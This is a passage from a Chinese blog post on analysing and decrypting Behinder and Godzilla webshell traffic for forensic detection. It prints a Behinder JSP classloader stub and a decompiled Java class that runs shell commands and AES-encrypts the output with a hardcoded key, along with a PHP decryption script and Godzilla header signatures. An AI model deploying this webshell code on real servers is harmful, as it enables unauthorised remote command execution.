xor_convert_str($post_raw,$key,$http_type):$post;</span><br><span class="line">// echo &quot;this is \$post&quot;.$post;</span><br><span class="line">if(preg_match(&#x27;/^\&#123;/i&#x27;,$post))&#123;</span><br><span class="line">    // echo $post;</span><br><span class="line">    // exit();</span><br><span class="line">    // echo &quot;error is &quot;.$post;</span><br><span class="line">    $raw_data = json_decode($post);</span><br><span class="line">    $result = [];</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($raw_data as $key =&gt; $value)&#123;</span><br><span class="line">            $result[$key] = base64_decode($value);</span><br><span class="line">        &#125;;</span><br><span class="line">        echo json_encode($result);</span><br><span class="line">    &#125;</span><br><span class="line">        // 捕获异常</span><br><span class="line">    catch(Exception $e)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Message: &#x27; .$e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr_2 = explode(&#x27;|&#x27;,$post);</span><br><span class="line">$func = $arr_2[0];</span><br><span class="line">isset($arr_2[1])?$parm=$arr_2[1]:$parm=$func;      # 解决tcp请求包截取不完整导致aes解密后没有</span><br><span class="line">// print(&quot;intotheexplode:&quot;.$parm);</span><br><span class="line">if ($parm === &#x27;&#x27;)&#123;</span><br><span class="line">    $parm=&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;;       # 解决 http截取的tcp包不完整的情况</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preg_match(&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;,$parm,$last_result);</span><br><span class="line">// echo &quot;匹配到的内容为&quot;.$result[0];</span><br><span class="line"></span><br><span class="line">if (count($last_result) &gt; 0)&#123;</span><br><span class="line">    echo base64_decode($last_result[0]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $parm;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decrypt.php -a 待解密数据 -k 密钥</span><br></pre></td></tr></table></figure>

<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F46cc7fae-9bff-4d30-ad01-339d51e037d4%2FUntitled.png?table=block&id=dc0a698e-2ed2-43fb-8e44-d1902f980a08&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F24e2a15b-2c78-4b47-b760-38c89273d1e8%2FUntitled.png?table=block&id=0c05b147-dfdb-4d57-aa71-336873b9a2e2&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>对返回包进行解密</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fded92381-1946-449e-a8d6-be7e9dcad4a4%2FUntitled.png?table=block&id=f99bcd16-6490-42d1-ac97-f1a72ca318ae&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F68ef9e59-3271-407f-bb73-dd817d941b59%2FUntitled.png?table=block&id=b09f2978-8090-42dd-86ed-fce6d5bdd35e&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<h3 id="冰蝎java"><a href="#冰蝎java" class="headerlink" title="冰蝎java"></a>冰蝎java</h3><p>跟php不同的是shell是用java写的，请求包解出来是个java的class文件，同时用的是AES ECB（但不一定绝对，试具体情况而定）</p>
<p>shell如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%                                                                                                                                                                                                                                                                                                                                                                                                                                 %&gt;</span><br></pre></td></tr></table></figure>

<p>主要就是对传入的数据包进行解密，并加载其字节码</p>
<p>抓取的数据包如下</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F68ebf5ef-1652-48c8-aaf5-c18381b11835%2FUntitled.png?table=block&id=c900c72a-7d5f-4cf8-ab71-080ef4865f2b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>对请求包进行解密</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F2d4726ca-6495-410c-b6c9-5d8037c7de9b%2FUntitled.png?table=block&id=2513f432-4c14-4972-8f4a-05381dddbfde&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>将输出下载为class文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package net.ktkt.wscoop.msoza;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Random;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line">public class Jwox &#123;</span><br><span class="line">    public static String cmd;</span><br><span class="line">    public static String path;</span><br><span class="line">    public static String whatever;</span><br><span class="line">    private static String status = &quot;success&quot;;</span><br><span class="line">    private Object Request;</span><br><span class="line">    private Object Response;</span><br><span class="line">    private Object Session;</span><br><span class="line"></span><br><span class="line">    public Jwox() &#123;</span><br><span class="line">        cmd = &quot;&quot;;</span><br><span class="line">        cmd = cmd + &quot;cd /d \&quot;D:\\java_study\\apache-tomcat-9.0.78\\bin\\\&quot;&amp;dir&quot;;</span><br><span class="line">        path = &quot;&quot;;</span><br><span class="line">        path = path + &quot;D:/java_study/apache-tomcat-9.0.78/bin/&quot;;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public boolean equals(Object obj) &#123;</span><br><span class="line">        HashMap result = new HashMap();</span><br><span class="line">        boolean var13 = false;</span><br><span class="line"></span><br><span class="line">        Object so;</span><br><span class="line">        Method write;</span><br><span class="line">        label77: &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                var13 = true;</span><br><span class="line">                this.fillContext(obj);</span><br><span class="line">                result.put(&quot;msg&quot;, this.RunCMD(cmd));</span><br><span class="line">                result.put(&quot;status&quot;, status);</span><br><span class="line">                var13 = false;</span><br><span class="line">                break label77;</span><br><span class="line">            &#125; catch (Exception var17) &#123;</span><br><span class="line">                result.put(&quot;msg&quot;, var17.getMessage());</span><br><span class="line">                result.put(&quot;status&quot;, &quot;fail&quot;);</span><br><span class="line">                var13 = false;</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                if (var13) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        Object so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response);</span><br><span class="line">                        Method write = so.getClass().getMethod(&quot;write&quot;, byte[].class);</span><br><span class="line">                        write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes(&quot;UTF-8&quot;)));</span><br><span class="line">                        so.getClass().getMethod(&quot;flush&quot;).invoke(so);</span><br><span class="line">                        so.getClass().getMethod(&quot;close&quot;).invoke(so);</span><br><span class="line">                    &#125; catch (Exception var14) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response);</span><br><span class="line">                write = so.getClass().getMethod(&quot;write&quot;, byte[].class);</span><br><span class="line">                write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes(&quot;UTF-8&quot;)));</span><br><span class="line">                so.getClass().getMethod(&quot;flush&quot;).invoke(so);</span><br><span class="line">                so.getClass().getMethod(&quot;close&quot;).invoke(so);</span><br><span class="line">            &#125; catch (Exception var15) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            so = this.Response.getClass().getMethod(&quot;getOutputStream&quot;).invoke(this.Response);</span><br><span class="line">            write = so.getClass().getMethod(&quot;write&quot;, byte[].class);</span><br><span class="line">            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes(&quot;UTF-8&quot;)));</span><br><span class="line">            so.getClass().getMethod(&quot;flush&quot;).invoke(so);</span><br><span class="line">            so.getClass().getMethod(&quot;close&quot;).invoke(so);</span><br><span class="line">        &#125; catch (Exception var16) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String RunCMD(String cmd) throws Exception &#123;</span><br><span class="line">        Charset osCharset = Charset.forName(System.getProperty(&quot;sun.jnu.encoding&quot;));</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        if (cmd != null &amp;&amp; cmd.length() &gt; 0) &#123;</span><br><span class="line">            Process p;</span><br><span class="line">            if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) &gt;= 0) &#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));</span><br><span class="line"></span><br><span class="line">            String disr;</span><br><span class="line">            for(disr = br.readLine(); disr != null; disr = br.readLine()) &#123;</span><br><span class="line">                result = result + disr + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br = new BufferedReader(new InputStreamReader(p.getErrorStream(), osCharset));</span><br><span class="line"></span><br><span class="line">            for(disr = br.readLine(); disr != null; disr = br.readLine()) &#123;</span><br><span class="line">                result = result + disr + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String base64encode(byte[] data) throws Exception &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        String version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line"></span><br><span class="line">        Class Base64;</span><br><span class="line">        try &#123;</span><br><span class="line">            this.getClass();</span><br><span class="line">            Base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object Encoder = Base64.getMethod(&quot;getEncoder&quot;, (Class[])null).invoke(Base64, (Object[])null);</span><br><span class="line">            result = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(Encoder, data);</span><br><span class="line">        &#125; catch (Throwable var7) &#123;</span><br><span class="line">            this.getClass();</span><br><span class="line">            Base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object Encoder = Base64.newInstance();</span><br><span class="line">            result = (String)Encoder.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(Encoder, data);</span><br><span class="line">            result = result.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String buildJson(Map&lt;String, String&gt; entity, boolean encode) throws Exception &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        String version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line">        sb.append(&quot;&#123;&quot;);</span><br><span class="line">        Iterator var5 = entity.keySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var5.hasNext()) &#123;</span><br><span class="line">            String key = (String)var5.next();</span><br><span class="line">            sb.append(&quot;\&quot;&quot; + key + &quot;\&quot;:\&quot;&quot;);</span><br><span class="line">            String value = ((String)entity.get(key)).toString();</span><br><span class="line">            if (encode) &#123;</span><br><span class="line">                Class Base64;</span><br><span class="line">                Object Encoder;</span><br><span class="line">                if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">                    this.getClass();</span><br><span class="line">                    Base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                    Encoder = Base64.getMethod(&quot;getEncoder&quot;, (Class[])null).invoke(Base64, (Object[])null);</span><br><span class="line">                    value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(Encoder, value.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    this.getClass();</span><br><span class="line">                    Base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">                    Encoder = Base64.newInstance();</span><br><span class="line">                    value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(Encoder, value.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">                    value = value.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(value);</span><br><span class="line">            sb.append(&quot;\&quot;,&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (sb.toString().endsWith(&quot;,&quot;)) &#123;</span><br><span class="line">            sb.setLength(sb.length() - 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sb.append(&quot;&#125;&quot;);</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void fillContext(Object obj) throws Exception &#123;</span><br><span class="line">        if (obj.getClass().getName().indexOf(&quot;PageContext&quot;) &gt;= 0) &#123;</span><br><span class="line">            this.Request = obj.getClass().getMethod(&quot;getRequest&quot;).invoke(obj);</span><br><span class="line">            this.Response = obj.getClass().getMethod(&quot;getResponse&quot;).invoke(obj);</span><br><span class="line">            this.Session = obj.getClass().getMethod(&quot;getSession&quot;).invoke(obj);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Map&lt;String, Object&gt; objMap = (Map)obj;</span><br><span class="line">            this.Session = objMap.get(&quot;session&quot;);</span><br><span class="line">            this.Response = objMap.get(&quot;response&quot;);</span><br><span class="line">            this.Request = objMap.get(&quot;request&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        this.Response.getClass().getMethod(&quot;setCharacterEncoding&quot;, String.class).invoke(this.Response, &quot;UTF-8&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private byte[] getMagic() throws Exception &#123;</span><br><span class="line">        String key = this.Session.getClass().getMethod(&quot;getAttribute&quot;, String.class).invoke(this.Session, &quot;u&quot;).toString();</span><br><span class="line">        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        byte[] buf = new byte[magicNum];</span><br><span class="line"></span><br><span class="line">        for(int i = 0; i &lt; buf.length; ++i) &#123;</span><br><span class="line">            buf[i] = (byte)random.nextInt(256);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private byte[] Encrypt(byte[] var1) throws Exception &#123;</span><br><span class="line">        String var2 = &quot;e45e329feb5d925b&quot;;</span><br><span class="line">        byte[] var3 = var2.getBytes(&quot;utf-8&quot;);</span><br><span class="line">        SecretKeySpec var4 = new SecretKeySpec(var3, &quot;AES&quot;);</span><br><span class="line">        Cipher var5 = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);</span><br><span class="line">        var5.init(1, var4);</span><br><span class="line">        byte[] var6 = var5.doFinal(var1);</span><br><span class="line"></span><br><span class="line">        Class var7;</span><br><span class="line">        try &#123;</span><br><span class="line">            var7 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object var8 = var7.getMethod(&quot;getEncoder&quot;, (Class[])null).invoke(var7, (Object[])null);</span><br><span class="line">            var6 = (byte[])var8.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(var8, var6);</span><br><span class="line">        &#125; catch (Throwable var12) &#123;</span><br><span class="line">            var7 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object var10 = var7.newInstance();</span><br><span class="line">            String var11 = (String)var10.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(var10, var6);</span><br><span class="line">            var11 = var11.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);</span><br><span class="line">            var6 = var11.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return var6;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到cmd的内容已经被我们解密出来了，这也就是到时候jsp文件实际进行类加载的class文件</p>
<p>返回包解密</p>
<p>返回的数据是使用16进制进行编码，可按照以下流程解密</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F10dff611-92fd-4b98-9615-c83914621e27%2FUntitled.png?table=block&id=f29bdec9-b577-4c9d-a73b-1d1f82538c59&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>点击倒数第二个数据包，并复制data值</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F3fe904f6-e46f-41b1-b35e-6b34c5175578%2FUntitled.png?table=block&id=7a659a52-b422-411e-8984-d126b64a9dd8&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F126ea814-a85d-44b1-9dde-354a6830a816%2FUntitled.png?table=block&id=b43ce739-6685-42de-9f99-5d99e9571eda&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fb55a61fd-005f-4e2a-9fe7-bfdc2260ecaf%2FUntitled.png?table=block&id=69757526-b9a3-41dd-a877-4cd7036d1baa&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>依旧是msg和status字段，再对msg的内容进行同样的解密</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F75304c73-ca91-44e9-9ea4-f4734b7efb71%2FUntitled.png?table=block&id=472d9c31-35b0-4f01-a705-ef67e0d91507&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>可以发现确实是我们执行的命令的返回结果</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>根据shell类型还有另外两种aspx与asp，整体做法与php如出一辙</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2Fd9e4f31e911a8955406d2583bdca42e5.png?table=block&id=0b95bd4d-17b7-48f3-bb38-bee66b80788c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="img"></p>
<p>同时除了常见的aes，还有xor的加密方式，但相对较为简单</p>
<p>为防止特征点检测有时还会在数据尾部加上magic冗余，但并不影响解密</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0186d32e84788b16db611c79033ea485.png?table=block&id=430c91f1-4e30-463a-8c20-46a96a52d33a&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="img"></p>
<p>总的来说冰蝎一般根据其加密脚本较为容易逆向解密</p>
<h2 id="哥斯拉流量（4-0）"><a href="#哥斯拉流量（4-0）" class="headerlink" title="哥斯拉流量（4.0）"></a>哥斯拉流量（4.0）</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h3><ol>
<li>Cookie这是一个强特征，在请求包cookie中有一个非常明显的就是末尾带分号</li>
</ol>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fbc335720-eac8-47b1-9906-1a02c0238077%2FUntitled.png?table=block&id=7968e414-932e-421b-afa7-d709f041a352&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1110&userId=&cache=v2" alt="Untitled"></p>
<ol>
<li>Accept算一个弱特征，与之前出现过的冰蝎相似，上网搜了一下，发现其实这个也是JDK引入的一个特征，并不是作者自定义的Accept</li>
</ol>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F6366132d-320a-4e4a-890e-6aa6443e8700%2FUntitled.png?table=block&id=b25367d3-90ad-46d6-b343-76469fa6ca0b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<ol>
<li>不考虑直接找到加密脚本外，哥斯拉最大的特征也是来自于其加密原理，返回包的数据前后十六位都是固定的哈希值</li>
</ol>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd4b28442-8cf5-4caf-a22f-ddb0d7f0aaf0%2FUntitled.png?table=block&id=686815fb-c6a3-4701-94c6-ee75de9fd60f&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<ol>
<li>第一个包内无cookie，后续两个包都有，并在第一个请求头中设置cookie</li>
</ol>
